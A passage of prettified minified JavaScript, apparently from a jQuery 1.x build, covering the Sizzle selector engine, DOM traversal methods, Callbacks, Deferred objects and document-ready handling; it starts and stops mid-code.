              (t.document && 11 !== t.document.nodeType)
            )
              return i;
          } catch (t) {}
        return ot(e, f, null, [t]).length > 0;
      }),
      (ot.contains = function (t, e) {
        return (t.ownerDocument || t) !== f && h(t), b(t, e);
      }),
      (ot.attr = function (t, e) {
        (t.ownerDocument || t) !== f && h(t);
        var o = i.attrHandle[e.toLowerCase()],
          r = o && L.call(i.attrHandle, e.toLowerCase()) ? o(t, e, !g) : void 0;
        return void 0 !== r
          ? r
          : n.attributes || !g
          ? t.getAttribute(e)
          : (r = t.getAttributeNode(e)) && r.specified
          ? r.value
          : null;
      }),
      (ot.error = function (t) {
        throw new Error("Syntax error, unrecognized expression: " + t);
      }),
      (ot.uniqueSort = function (t) {
        var e,
          i = [],
          o = 0,
          r = 0;
        if (
          ((d = !n.detectDuplicates),
          (u = !n.sortStable && t.slice(0)),
          t.sort(k),
          d)
        ) {
          for (; (e = t[r++]); ) e === t[r] && (o = i.push(r));
          for (; o--; ) t.splice(i[o], 1);
        }
        return (u = null), t;
      }),
      (o = ot.getText =
        function (t) {
          var e,
            n = "",
            i = 0,
            r = t.nodeType;
          if (r) {
            if (1 === r || 9 === r || 11 === r) {
              if ("string" == typeof t.textContent) return t.textContent;
              for (t = t.firstChild; t; t = t.nextSibling) n += o(t);
            } else if (3 === r || 4 === r) return t.nodeValue;
          } else for (; (e = t[i++]); ) n += o(e);
          return n;
        }),
      ((i = ot.selectors =
        {
          cacheLength: 50,
          createPseudo: st,
          match: Y,
          attrHandle: {},
          find: {},
          relative: {
            ">": { dir: "parentNode", first: !0 },
            " ": { dir: "parentNode" },
            "+": { dir: "previousSibling", first: !0 },
            "~": { dir: "previousSibling" },
          },
          preFilter: {
            ATTR: function (t) {
              return (
                (t[1] = t[1].replace(et, nt)),
                (t[3] = (t[3] || t[4] || t[5] || "").replace(et, nt)),
                "~=" === t[2] && (t[3] = " " + t[3] + " "),
                t.slice(0, 4)
              );
            },
            CHILD: function (t) {
              return (
                (t[1] = t[1].toLowerCase()),
                "nth" === t[1].slice(0, 3)
                  ? (t[3] || ot.error(t[0]),
                    (t[4] = +(t[4]
                      ? t[5] + (t[6] || 1)
                      : 2 * ("even" === t[3] || "odd" === t[3]))),
                    (t[5] = +(t[7] + t[8] || "odd" === t[3])))
                  : t[3] && ot.error(t[0]),
                t
              );
            },
            PSEUDO: function (t) {
              var e,
                n = !t[6] && t[2];
              return Y.CHILD.test(t[0])
                ? null
                : (t[3]
                    ? (t[2] = t[4] || t[5] || "")
                    : n &&
                      X.test(n) &&
                      (e = s(n, !0)) &&
                      (e = n.indexOf(")", n.length - e) - n.length) &&
                      ((t[0] = t[0].slice(0, e)), (t[2] = n.slice(0, e))),
                  t.slice(0, 3));
            },
          },
          filter: {
            TAG: function (t) {
              var e = t.replace(et, nt).toLowerCase();
              return "*" === t
                ? function () {
                    return !0;
                  }
                : function (t) {
                    return t.nodeName && t.nodeName.toLowerCase() === e;
                  };
            },
            CLASS: function (t) {
              var e = T[t + " "];
              return (
                e ||
                ((e = new RegExp("(^|" + z + ")" + t + "(" + z + "|$)")) &&
                  T(t, function (t) {
                    return e.test(
                      ("string" == typeof t.className && t.className) ||
                        (void 0 !== t.getAttribute &&
                          t.getAttribute("class")) ||
                        ""
                    );
                  }))
              );
            },
            ATTR: function (t, e, n) {
              return function (i) {
                var o = ot.attr(i, t);
                return null == o
                  ? "!=" === e
                  : !e ||
                      ((o += ""),
                      "=" === e
                        ? o === n
                        : "!=" === e
                        ? o !== n
                        : "^=" === e
                        ? n && 0 === o.indexOf(n)
                        : "*=" === e
                        ? n && o.indexOf(n) > -1
                        : "$=" === e
                        ? n && o.slice(-n.length) === n
                        : "~=" === e
                        ? (" " + o.replace(R, " ") + " ").indexOf(n) > -1
                        : "|=" === e &&
                          (o === n || o.slice(0, n.length + 1) === n + "-"));
              };
            },
            CHILD: function (t, e, n, i, o) {
              var r = "nth" !== t.slice(0, 3),
                s = "last" !== t.slice(-4),
                a = "of-type" === e;
              return 1 === i && 0 === o
                ? function (t) {
                    return !!t.parentNode;
                  }
                : function (e, n, l) {
                    var c,
                      u,
                      d,
                      h,
                      f,
                      p,
                      g = r !== s ? "nextSibling" : "previousSibling",
                      m = e.parentNode,
                      v = a && e.nodeName.toLowerCase(),
                      y = !l && !a,
                      b = !1;
                    if (m) {
                      if (r) {
                        for (; g; ) {
                          for (h = e; (h = h[g]); )
                            if (
                              a
                                ? h.nodeName.toLowerCase() === v
                                : 1 === h.nodeType
                            )
                              return !1;
                          p = g = "only" === t && !p && "nextSibling";
                        }
                        return !0;
                      }
                      if (((p = [s ? m.firstChild : m.lastChild]), s && y)) {
                        for (
                          b =
                            (f =
                              (c =
                                (u =
                                  (d = (h = m)[_] || (h[_] = {}))[h.uniqueID] ||
                                  (d[h.uniqueID] = {}))[t] || [])[0] === x &&
                              c[1]) && c[2],
                            h = f && m.childNodes[f];
                          (h = (++f && h && h[g]) || (b = f = 0) || p.pop());

                        )
                          if (1 === h.nodeType && ++b && h === e) {
                            u[t] = [x, f, b];
                            break;
                          }
                      } else if (
                        (y &&
                          (b = f =
                            (c =
                              (u =
                                (d = (h = e)[_] || (h[_] = {}))[h.uniqueID] ||
                                (d[h.uniqueID] = {}))[t] || [])[0] === x &&
                            c[1]),
                        !1 === b)
                      )
                        for (
                          ;
                          (h = (++f && h && h[g]) || (b = f = 0) || p.pop()) &&
                          ((a
                            ? h.nodeName.toLowerCase() !== v
                            : 1 !== h.nodeType) ||
                            !++b ||
                            (y &&
                              ((u =
                                (d = h[_] || (h[_] = {}))[h.uniqueID] ||
                                (d[h.uniqueID] = {}))[t] = [x, b]),
                            h !== e));

                        );
                      return (b -= o) === i || (b % i == 0 && b / i >= 0);
                    }
                  };
            },
            PSEUDO: function (t, e) {
              var n,
                o =
                  i.pseudos[t] ||
                  i.setFilters[t.toLowerCase()] ||
                  ot.error("unsupported pseudo: " + t);
              return o[_]
                ? o(e)
                : o.length > 1
                ? ((n = [t, t, "", e]),
                  i.setFilters.hasOwnProperty(t.toLowerCase())
                    ? st(function (t, n) {
                        for (var i, r = o(t, e), s = r.length; s--; )
                          t[(i = H(t, r[s]))] = !(n[i] = r[s]);
                      })
                    : function (t) {
                        return o(t, 0, n);
                      })
                : o;
            },
          },
          pseudos: {
            not: st(function (t) {
              var e = [],
                n = [],
                i = a(t.replace(W, "$1"));
              return i[_]
                ? st(function (t, e, n, o) {
                    for (var r, s = i(t, null, o, []), a = t.length; a--; )
                      (r = s[a]) && (t[a] = !(e[a] = r));
                  })
                : function (t, o, r) {
                    return (
                      (e[0] = t), i(e, null, r, n), (e[0] = null), !n.pop()
                    );
                  };
            }),
            has: st(function (t) {
              return function (e) {
                return ot(t, e).length > 0;
              };
            }),
            contains: st(function (t) {
              return (
                (t = t.replace(et, nt)),
                function (e) {
                  return (e.textContent || e.innerText || o(e)).indexOf(t) > -1;
                }
              );
            }),
            lang: st(function (t) {
              return (
                V.test(t || "") || ot.error("unsupported lang: " + t),
                (t = t.replace(et, nt).toLowerCase()),
                function (e) {
                  var n;
                  do {
                    if (
                      (n = g
                        ? e.lang
                        : e.getAttribute("xml:lang") || e.getAttribute("lang"))
                    )
                      return (
                        (n = n.toLowerCase()) === t || 0 === n.indexOf(t + "-")
                      );
                  } while ((e = e.parentNode) && 1 === e.nodeType);
                  return !1;
                }
              );
            }),
            target: function (e) {
              var n = t.location && t.location.hash;
              return n && n.slice(1) === e.id;
            },
            root: function (t) {
              return t === p;
            },
            focus: function (t) {
              return (
                t === f.activeElement &&
                (!f.hasFocus || f.hasFocus()) &&
                !!(t.type || t.href || ~t.tabIndex)
              );
            },
            enabled: function (t) {
              return !1 === t.disabled;
            },
            disabled: function (t) {
              return !0 === t.disabled;
            },
            checked: function (t) {
              var e = t.nodeName.toLowerCase();
              return (
                ("input" === e && !!t.checked) ||
                ("option" === e && !!t.selected)
              );
            },
            selected: function (t) {
              return (
                t.parentNode && t.parentNode.selectedIndex, !0 === t.selected
              );
            },
            empty: function (t) {
              for (t = t.firstChild; t; t = t.nextSibling)
                if (t.nodeType < 6) return !1;
              return !0;
            },
            parent: function (t) {
              return !i.pseudos.empty(t);
            },
            header: function (t) {
              return Q.test(t.nodeName);
            },
            input: function (t) {
              return K.test(t.nodeName);
            },
            button: function (t) {
              var e = t.nodeName.toLowerCase();
              return ("input" === e && "button" === t.type) || "button" === e;
            },
            text: function (t) {
              var e;
              return (
                "input" === t.nodeName.toLowerCase() &&
                "text" === t.type &&
                (null == (e = t.getAttribute("type")) ||
                  "text" === e.toLowerCase())
              );
            },
            first: ht(function () {
              return [0];
            }),
            last: ht(function (t, e) {
              return [e - 1];
            }),
            eq: ht(function (t, e, n) {
              return [0 > n ? n + e : n];
            }),
            even: ht(function (t, e) {
              for (var n = 0; e > n; n += 2) t.push(n);
              return t;
            }),
            odd: ht(function (t, e) {
              for (var n = 1; e > n; n += 2) t.push(n);
              return t;
            }),
            lt: ht(function (t, e, n) {
              for (var i = 0 > n ? n + e : n; --i >= 0; ) t.push(i);
              return t;
            }),
            gt: ht(function (t, e, n) {
              for (var i = 0 > n ? n + e : n; ++i < e; ) t.push(i);
              return t;
            }),
          },
        }).pseudos.nth = i.pseudos.eq),
      { radio: !0, checkbox: !0, file: !0, password: !0, image: !0 }))
        i.pseudos[e] = ut(e);
      for (e in { submit: !0, reset: !0 }) i.pseudos[e] = dt(e);
      function pt() {}
      function gt(t) {
        for (var e = 0, n = t.length, i = ""; n > e; e++) i += t[e].value;
        return i;
      }
      function mt(t, e, n) {
        var i = e.dir,
          o = n && "parentNode" === i,
          r = E++;
        return e.first
          ? function (e, n, r) {
              for (; (e = e[i]); ) if (1 === e.nodeType || o) return t(e, n, r);
            }
          : function (e, n, s) {
              var a,
                l,
                c,
                u = [x, r];
              if (s) {
                for (; (e = e[i]); )
                  if ((1 === e.nodeType || o) && t(e, n, s)) return !0;
              } else
                for (; (e = e[i]); )
                  if (1 === e.nodeType || o) {
                    if (
                      (a = (l =
                        (c = e[_] || (e[_] = {}))[e.uniqueID] ||
                        (c[e.uniqueID] = {}))[i]) &&
                      a[0] === x &&
                      a[1] === r
                    )
                      return (u[2] = a[2]);
                    if (((l[i] = u), (u[2] = t(e, n, s)))) return !0;
                  }
            };
      }
      function vt(t) {
        return t.length > 1
          ? function (e, n, i) {
              for (var o = t.length; o--; ) if (!t[o](e, n, i)) return !1;
              return !0;
            }
          : t[0];
      }
      function yt(t, e, n, i, o) {
        for (var r, s = [], a = 0, l = t.length, c = null != e; l > a; a++)
          (r = t[a]) && ((n && !n(r, i, o)) || (s.push(r), c && e.push(a)));
        return s;
      }
      function bt(t, e, n, i, o, r) {
        return (
          i && !i[_] && (i = bt(i)),
          o && !o[_] && (o = bt(o, r)),
          st(function (r, s, a, l) {
            var c,
              u,
              d,
              h = [],
              f = [],
              p = s.length,
              g =
                r ||
                (function (t, e, n) {
                  for (var i = 0, o = e.length; o > i; i++) ot(t, e[i], n);
                  return n;
                })(e || "*", a.nodeType ? [a] : a, []),
              m = !t || (!r && e) ? g : yt(g, h, t, a, l),
              v = n ? (o || (r ? t : p || i) ? [] : s) : m;
            if ((n && n(m, v, a, l), i))
              for (c = yt(v, f), i(c, [], a, l), u = c.length; u--; )
                (d = c[u]) && (v[f[u]] = !(m[f[u]] = d));
            if (r) {
              if (o || t) {
                if (o) {
                  for (c = [], u = v.length; u--; )
                    (d = v[u]) && c.push((m[u] = d));
                  o(null, (v = []), c, l);
                }
                for (u = v.length; u--; )
                  (d = v[u]) &&
                    (c = o ? H(r, d) : h[u]) > -1 &&
                    (r[c] = !(s[c] = d));
              }
            } else (v = yt(v === s ? v.splice(p, v.length) : v)), o ? o(null, s, v, l) : j.apply(s, v);
          })
        );
      }
      function _t(t) {
        for (
          var e,
            n,
            o,
            r = t.length,
            s = i.relative[t[0].type],
            a = s || i.relative[" "],
            l = s ? 1 : 0,
            u = mt(
              function (t) {
                return t === e;
              },
              a,
              !0
            ),
            d = mt(
              function (t) {
                return H(e, t) > -1;
              },
              a,
              !0
            ),
            h = [
              function (t, n, i) {
                var o =
                  (!s && (i || n !== c)) ||
                  ((e = n).nodeType ? u(t, n, i) : d(t, n, i));
                return (e = null), o;
              },
            ];
          r > l;
          l++
        )
          if ((n = i.relative[t[l].type])) h = [mt(vt(h), n)];
          else {
            if ((n = i.filter[t[l].type].apply(null, t[l].matches))[_]) {
              for (o = ++l; r > o && !i.relative[t[o].type]; o++);
              return bt(
                l > 1 && vt(h),
                l > 1 &&
                  gt(
                    t
                      .slice(0, l - 1)
                      .concat({ value: " " === t[l - 2].type ? "*" : "" })
                  ).replace(W, "$1"),
                n,
                o > l && _t(t.slice(l, o)),
                r > o && _t((t = t.slice(o))),
                r > o && gt(t)
              );
            }
            h.push(n);
          }
        return vt(h);
      }
      function wt(t, e) {
        var n = e.length > 0,
          o = t.length > 0,
          r = function (r, s, a, l, u) {
            var d,
              p,
              m,
              v = 0,
              y = "0",
              b = r && [],
              _ = [],
              w = c,
              E = r || (o && i.find.TAG("*", u)),
              T = (x += null == w ? 1 : Math.random() || 0.1),
              C = E.length;
            for (
              u && (c = s === f || s || u);
              y !== C && null != (d = E[y]);
              y++
            ) {
              if (o && d) {
                for (
                  p = 0, s || d.ownerDocument === f || (h(d), (a = !g));
                  (m = t[p++]);

                )
                  if (m(d, s || f, a)) {
                    l.push(d);
                    break;
                  }
                u && (x = T);
              }
              n && ((d = !m && d) && v--, r && b.push(d));
            }
            if (((v += y), n && y !== v)) {
              for (p = 0; (m = e[p++]); ) m(b, _, s, a);
              if (r) {
                if (v > 0) for (; y--; ) b[y] || _[y] || (_[y] = N.call(l));
                _ = yt(_);
              }
              j.apply(l, _),
                u && !r && _.length > 0 && v + e.length > 1 && ot.uniqueSort(l);
            }
            return u && ((x = T), (c = w)), b;
          };
        return n ? st(r) : r;
      }
      return (
        (pt.prototype = i.filters = i.pseudos),
        (i.setFilters = new pt()),
        (s = ot.tokenize =
          function (t, e) {
            var n,
              o,
              r,
              s,
              a,
              l,
              c,
              u = C[t + " "];
            if (u) return e ? 0 : u.slice(0);
            for (a = t, l = [], c = i.preFilter; a; ) {
              for (s in ((n && !(o = q.exec(a))) ||
                (o && (a = a.slice(o[0].length) || a), l.push((r = []))),
              (n = !1),
              (o = F.exec(a)) &&
                ((n = o.shift()),
                r.push({ value: n, type: o[0].replace(W, " ") }),
                (a = a.slice(n.length))),
              i.filter))
                !(o = Y[s].exec(a)) ||
                  (c[s] && !(o = c[s](o))) ||
                  ((n = o.shift()),
                  r.push({ value: n, type: s, matches: o }),
                  (a = a.slice(n.length)));
              if (!n) break;
            }
            return e ? a.length : a ? ot.error(t) : C(t, l).slice(0);
          }),
        (a = ot.compile =
          function (t, e) {
            var n,
              i = [],
              o = [],
              r = A[t + " "];
            if (!r) {
              for (e || (e = s(t)), n = e.length; n--; )
                (r = _t(e[n]))[_] ? i.push(r) : o.push(r);
              (r = A(t, wt(o, i))).selector = t;
            }
            return r;
          }),
        (l = ot.select =
          function (t, e, o, r) {
            var l,
              c,
              u,
              d,
              h,
              f = "function" == typeof t && t,
              p = !r && s((t = f.selector || t));
            if (((o = o || []), 1 === p.length)) {
              if (
                (c = p[0] = p[0].slice(0)).length > 2 &&
                "ID" === (u = c[0]).type &&
                n.getById &&
                9 === e.nodeType &&
                g &&
                i.relative[c[1].type]
              ) {
                if (
                  !(e = (i.find.ID(u.matches[0].replace(et, nt), e) || [])[0])
                )
                  return o;
                f && (e = e.parentNode), (t = t.slice(c.shift().value.length));
              }
              for (
                l = Y.needsContext.test(t) ? 0 : c.length;
                l-- && ((u = c[l]), !i.relative[(d = u.type)]);

              )
                if (
                  (h = i.find[d]) &&
                  (r = h(
                    u.matches[0].replace(et, nt),
                    (J.test(c[0].type) && ft(e.parentNode)) || e
                  ))
                ) {
                  if ((c.splice(l, 1), !(t = r.length && gt(c))))
                    return j.apply(o, r), o;
                  break;
                }
            }
            return (
              (f || a(t, p))(
                r,
                e,
                !g,
                o,
                !e || (J.test(t) && ft(e.parentNode)) || e
              ),
              o
            );
          }),
        (n.sortStable = _.split("").sort(k).join("") === _),
        (n.detectDuplicates = !!d),
        h(),
        (n.sortDetached = at(function (t) {
          return 1 & t.compareDocumentPosition(f.createElement("div"));
        })),
        at(function (t) {
          return (
            (t.innerHTML = "<a href='#'></a>"),
            "#" === t.firstChild.getAttribute("href")
          );
        }) ||
          lt("type|href|height|width", function (t, e, n) {
            return n
              ? void 0
              : t.getAttribute(e, "type" === e.toLowerCase() ? 1 : 2);
          }),
        (n.attributes &&
          at(function (t) {
            return (
              (t.innerHTML = "<input/>"),
              t.firstChild.setAttribute("value", ""),
              "" === t.firstChild.getAttribute("value")
            );
          })) ||
          lt("value", function (t, e, n) {
            return n || "input" !== t.nodeName.toLowerCase()
              ? void 0
              : t.defaultValue;
          }),
        at(function (t) {
          return null == t.getAttribute("disabled");
        }) ||
          lt(M, function (t, e, n) {
            var i;
            return n
              ? void 0
              : !0 === t[e]
              ? e.toLowerCase()
              : (i = t.getAttributeNode(e)) && i.specified
              ? i.value
              : null;
          }),
        ot
      );
    })(t);
    (f.find = b),
      (f.expr = b.selectors),
      (f.expr[":"] = f.expr.pseudos),
      (f.uniqueSort = f.unique = b.uniqueSort),
      (f.text = b.getText),
      (f.isXMLDoc = b.isXML),
      (f.contains = b.contains);
    var _ = function (t, e, n) {
        for (var i = [], o = void 0 !== n; (t = t[e]) && 9 !== t.nodeType; )
          if (1 === t.nodeType) {
            if (o && f(t).is(n)) break;
            i.push(t);
          }
        return i;
      },
      w = function (t, e) {
        for (var n = []; t; t = t.nextSibling)
          1 === t.nodeType && t !== e && n.push(t);
        return n;
      },
      x = f.expr.match.needsContext,
      E = /^<([\w-]+)\s*\/?>(?:<\/\1>|)$/,
      T = /^.[^:#\[\.,]*$/;
    function C(t, e, n) {
      if (f.isFunction(e))
        return f.grep(t, function (t, i) {
          return !!e.call(t, i, t) !== n;
        });
      if (e.nodeType)
        return f.grep(t, function (t) {
          return (t === e) !== n;
        });
      if ("string" == typeof e) {
        if (T.test(e)) return f.filter(e, t, n);
        e = f.filter(e, t);
      }
      return f.grep(t, function (t) {
        return f.inArray(t, e) > -1 !== n;
      });
    }
    (f.filter = function (t, e, n) {
      var i = e[0];
      return (
        n && (t = ":not(" + t + ")"),
        1 === e.length && 1 === i.nodeType
          ? f.find.matchesSelector(i, t)
            ? [i]
            : []
          : f.find.matches(
              t,
              f.grep(e, function (t) {
                return 1 === t.nodeType;
              })
            )
      );
    }),
      f.fn.extend({
        find: function (t) {
          var e,
            n = [],
            i = this,
            o = i.length;
          if ("string" != typeof t)
            return this.pushStack(
              f(t).filter(function () {
                for (e = 0; o > e; e++) if (f.contains(i[e], this)) return !0;
              })
            );
          for (e = 0; o > e; e++) f.find(t, i[e], n);
          return (
            ((n = this.pushStack(o > 1 ? f.unique(n) : n)).selector = this
              .selector
              ? this.selector + " " + t
              : t),
            n
          );
        },
        filter: function (t) {
          return this.pushStack(C(this, t || [], !1));
        },
        not: function (t) {
          return this.pushStack(C(this, t || [], !0));
        },
        is: function (t) {
          return !!C(
            this,
            "string" == typeof t && x.test(t) ? f(t) : t || [],
            !1
          ).length;
        },
      });
    var A,
      k = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]*))$/;
    ((f.fn.init = function (t, e, n) {
      var o, r;
      if (!t) return this;
      if (((n = n || A), "string" == typeof t)) {
        if (
          !(o =
            "<" === t.charAt(0) &&
            ">" === t.charAt(t.length - 1) &&
            t.length >= 3
              ? [null, t, null]
              : k.exec(t)) ||
          (!o[1] && e)
        )
          return !e || e.jquery
            ? (e || n).find(t)
            : this.constructor(e).find(t);
        if (o[1]) {
          if (
            ((e = e instanceof f ? e[0] : e),
            f.merge(
              this,
              f.parseHTML(o[1], e && e.nodeType ? e.ownerDocument || e : i, !0)
            ),
            E.test(o[1]) && f.isPlainObject(e))
          )
            for (o in e)
              f.isFunction(this[o]) ? this[o](e[o]) : this.attr(o, e[o]);
          return this;
        }
        if ((r = i.getElementById(o[2])) && r.parentNode) {
          if (r.id !== o[2]) return A.find(t);
          (this.length = 1), (this[0] = r);
        }
        return (this.context = i), (this.selector = t), this;
      }
      return t.nodeType
        ? ((this.context = this[0] = t), (this.length = 1), this)
        : f.isFunction(t)
        ? void 0 !== n.ready
          ? n.ready(t)
          : t(f)
        : (void 0 !== t.selector &&
            ((this.selector = t.selector), (this.context = t.context)),
          f.makeArray(t, this));
    }).prototype = f.fn),
      (A = f(i));
    var S = /^(?:parents|prev(?:Until|All))/,
      L = { children: !0, contents: !0, next: !0, prev: !0 };
    function D(t, e) {
      do {
        t = t[e];
      } while (t && 1 !== t.nodeType);
      return t;
    }
    f.fn.extend({
      has: function (t) {
        var e,
          n = f(t, this),
          i = n.length;
        return this.filter(function () {
          for (e = 0; i > e; e++) if (f.contains(this, n[e])) return !0;
        });
      },
      closest: function (t, e) {
        for (
          var n,
            i = 0,
            o = this.length,
            r = [],
            s = x.test(t) || "string" != typeof t ? f(t, e || this.context) : 0;
          o > i;
          i++
        )
          for (n = this[i]; n && n !== e; n = n.parentNode)
            if (
              n.nodeType < 11 &&
              (s
                ? s.index(n) > -1
                : 1 === n.nodeType && f.find.matchesSelector(n, t))
            ) {
              r.push(n);
              break;
            }
        return this.pushStack(r.length > 1 ? f.uniqueSort(r) : r);
      },
      index: function (t) {
        return t
          ? "string" == typeof t
            ? f.inArray(this[0], f(t))
            : f.inArray(t.jquery ? t[0] : t, this)
          : this[0] && this[0].parentNode
          ? this.first().prevAll().length
          : -1;
      },
      add: function (t, e) {
        return this.pushStack(f.uniqueSort(f.merge(this.get(), f(t, e))));
      },
      addBack: function (t) {
        return this.add(
          null == t ? this.prevObject : this.prevObject.filter(t)
        );
      },
    }),
      f.each(
        {
          parent: function (t) {
            var e = t.parentNode;
            return e && 11 !== e.nodeType ? e : null;
          },
          parents: function (t) {
            return _(t, "parentNode");
          },
          parentsUntil: function (t, e, n) {
            return _(t, "parentNode", n);
          },
          next: function (t) {
            return D(t, "nextSibling");
          },
          prev: function (t) {
            return D(t, "previousSibling");
          },
          nextAll: function (t) {
            return _(t, "nextSibling");
          },
          prevAll: function (t) {
            return _(t, "previousSibling");
          },
          nextUntil: function (t, e, n) {
            return _(t, "nextSibling", n);
          },
          prevUntil: function (t, e, n) {
            return _(t, "previousSibling", n);
          },
          siblings: function (t) {
            return w((t.parentNode || {}).firstChild, t);
          },
          children: function (t) {
            return w(t.firstChild);
          },
          contents: function (t) {
            return f.nodeName(t, "iframe")
              ? t.contentDocument || t.contentWindow.document
              : f.merge([], t.childNodes);
          },
        },
        function (t, e) {
          f.fn[t] = function (n, i) {
            var o = f.map(this, e, n);
            return (
              "Until" !== t.slice(-5) && (i = n),
              i && "string" == typeof i && (o = f.filter(i, o)),
              this.length > 1 &&
                (L[t] || (o = f.uniqueSort(o)), S.test(t) && (o = o.reverse())),
              this.pushStack(o)
            );
          };
        }
      );
    var N,
      O,
      j = /\S+/g;
    function P() {
      i.addEventListener
        ? (i.removeEventListener("DOMContentLoaded", H),
          t.removeEventListener("load", H))
        : (i.detachEvent("onreadystatechange", H), t.detachEvent("onload", H));
    }
    function H() {
      (i.addEventListener ||
        "load" === t.event.type ||
        "complete" === i.readyState) &&
        (P(), f.ready());
    }
    for (O in ((f.Callbacks = function (t) {
      t =
        "string" == typeof t
          ? (function (t) {
              var e = {};
              return (
                f.each(t.match(j) || [], function (t, n) {
                  e[n] = !0;
                }),
                e
              );
            })(t)
          : f.extend({}, t);
      var e,
        n,
        i,
        o,
        r = [],
        s = [],
        a = -1,
        l = function () {
          for (o = t.once, i = e = !0; s.length; a = -1)
            for (n = s.shift(); ++a < r.length; )
              !1 === r[a].apply(n[0], n[1]) &&
                t.stopOnFalse &&
                ((a = r.length), (n = !1));
          t.memory || (n = !1), (e = !1), o && (r = n ? [] : "");
        },
        c = {
          add: function () {
            return (
              r &&
                (n && !e && ((a = r.length - 1), s.push(n)),
                (function e(n) {
                  f.each(n, function (n, i) {
                    f.isFunction(i)
                      ? (t.unique && c.has(i)) || r.push(i)
                      : i && i.length && "string" !== f.type(i) && e(i);
                  });
                })(arguments),
                n && !e && l()),
              this
            );
          },
          remove: function () {
            return (
              f.each(arguments, function (t, e) {
                for (var n; (n = f.inArray(e, r, n)) > -1; )
                  r.splice(n, 1), a >= n && a--;
              }),
              this
            );
          },
          has: function (t) {
            return t ? f.inArray(t, r) > -1 : r.length > 0;
          },
          empty: function () {
            return r && (r = []), this;
          },
          disable: function () {
            return (o = s = []), (r = n = ""), this;
          },
          disabled: function () {
            return !r;
          },
          lock: function () {
            return (o = !0), n || c.disable(), this;
          },
          locked: function () {
            return !!o;
          },
          fireWith: function (t, n) {
            return (
              o ||
                ((n = [t, (n = n || []).slice ? n.slice() : n]),
                s.push(n),
                e || l()),
              this
            );
          },
          fire: function () {
            return c.fireWith(this, arguments), this;
          },
          fired: function () {
            return !!i;
          },
        };
      return c;
    }),
    f.extend({
      Deferred: function (t) {
        var e = [
            ["resolve", "done", f.Callbacks("once memory"), "resolved"],
            ["reject", "fail", f.Callbacks("once memory"), "rejected"],
            ["notify", "progress", f.Callbacks("memory")],
          ],
          n = "pending",
          i = {
            state: function () {
              return n;
            },
            always: function () {
              return o.done(arguments).fail(arguments), this;
            },
            then: function () {
              var t = arguments;
              return f
                .Deferred(function (n) {
                  f.each(e, function (e, r) {
                    var s = f.isFunction(t[e]) && t[e];
                    o[r[1]](function () {
                      var t = s && s.apply(this, arguments);
                      t && f.isFunction(t.promise)
                        ? t
                            .promise()
                            .progress(n.notify)
                            .done(n.resolve)
                            .fail(n.reject)
                        : n[r[0] + "With"](
                            this === i ? n.promise() : this,
                            s ? [t] : arguments
                          );
                    });
                  }),
                    (t = null);
                })
                .promise();
            },
            promise: function (t) {
              return null != t ? f.extend(t, i) : i;
            },
          },
          o = {};
        return (
          (i.pipe = i.then),
          f.each(e, function (t, r) {
            var s = r[2],
              a = r[3];
            (i[r[1]] = s.add),
              a &&
                s.add(
                  function () {
                    n = a;
                  },
                  e[1 ^ t][2].disable,
                  e[2][2].lock
                ),
              (o[r[0]] = function () {
                return o[r[0] + "With"](this === o ? i : this, arguments), this;
              }),
              (o[r[0] + "With"] = s.fireWith);
          }),
          i.promise(o),
          t && t.call(o, o),
          o
        );
      },
      when: function (t) {
        var e,
          n,
          i,
          r = 0,
          s = o.call(arguments),
          a = s.length,
          l = 1 !== a || (t && f.isFunction(t.promise)) ? a : 0,
          c = 1 === l ? t : f.Deferred(),
          u = function (t, n, i) {
            return function (r) {
              (n[t] = this),
                (i[t] = arguments.length > 1 ? o.call(arguments) : r),
                i === e ? c.notifyWith(n, i) : --l || c.resolveWith(n, i);
            };
          };
        if (a > 1)
          for (e = new Array(a), n = new Array(a), i = new Array(a); a > r; r++)
            s[r] && f.isFunction(s[r].promise)
              ? s[r]
                  .promise()
                  .progress(u(r, n, e))
                  .done(u(r, i, s))
                  .fail(c.reject)
              : --l;
        return l || c.resolveWith(i, s), c.promise();
      },
    }),
    (f.fn.ready = function (t) {
      return f.ready.promise().done(t), this;
    }),
    f.extend({
      isReady: !1,
      readyWait: 1,
      holdReady: function (t) {
        t ? f.readyWait++ : f.ready(!0);
      },
      ready: function (t) {
        (!0 === t ? --f.readyWait : f.isReady) ||
          ((f.isReady = !0),
          (!0 !== t && --f.readyWait > 0) ||
            (N.resolveWith(i, [f]),
            f.fn.triggerHandler &&
              (f(i).triggerHandler("ready"), f(i).off("ready"))));
      },
    }),
    (f.ready.promise = function (e) {
      if (!N)
        if (
          ((N = f.Deferred()),
          "complete" === i.readyState ||
            ("loading" !== i.readyState && !i.documentElement.doScroll))
        )
          t.setTimeout(f.ready);
        else if (i.addEventListener)
          i.addEventListener("DOMContentLoaded", H),
            t.addEventListener("load", H);
        else {
          i.attachEvent("onreadystatechange", H), t.attachEvent("onload", H);
          var n = !1;
          try {
            n = null == t.frameElement && i.documentElement;
          } catch (t) {}
          n &&
            n.doScroll &&
            (function e() {
              if (!f.isReady) {
                try {
                  n.doScroll("left");
                } catch (n) {
                  return t.setTimeout(e, 50);
                }
                P(), f.ready();
              }
            })();
        }
      return N.promise(e);
    }),
    f.ready.promise(),
    f(d)))
      break;
    (d.ownFirst = "0" === O),
      (d.inlineBlockNeedsLayout = !1),
      f(function () {
        var t, e, n, o;
        (n = i.getElementsByTagName("body")[0]) &&
          n.style &&
          ((e = i.createElement("div")),
          ((o = i.createElement("div")).style.cssText =
            "position:absolute;border:0;width:0;height:0;top:0;left:-9999px"),
          n.appendChild(o).appendChild(e),
          void 0 !== e.style.zoom &&
            ((e.style.cssText =
              "display:inline;margin:0;border:0;padding:1px;width:1px;zoom:1"),
            (d.inlineBlockNeedsLayout = t = 3 === e.offsetWidth),
            t && (n.style.zoom = 1)),
          n.removeChild(o));
      }),
      (function () {
        var t = i.createElement("div");
        d.deleteExpando = !0;
        try {
          delete t.test;
        } catch (t) {
          d.deleteExpando = !1;
        }
        t = null;
      })();
    var M = function (t) {
        var e = f.noData[(t.nodeName + " ").toLowerCase()],
          n = +t.nodeType || 1;
        return (
          (1 === n || 9 === n) &&
          (!e || (!0 !== e && t.getAttribute("classid") === e))
        );
      },
      z = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
      B = /([A-Z])/g;
    function I(t, e, n) {
      if (void 0 === n && 1 === t.nodeType) {
        var i = "data-" + e.replace(B, "-$1").toLowerCase();
        if ("string" == typeof (n = t.getAttribute(i))) {
          try {
            n =
              "true" === n ||
              ("false" !== n &&
                ("null" === n
                  ? null
                  : +n + "" === n
                  ? +n
                  : z.test(n)
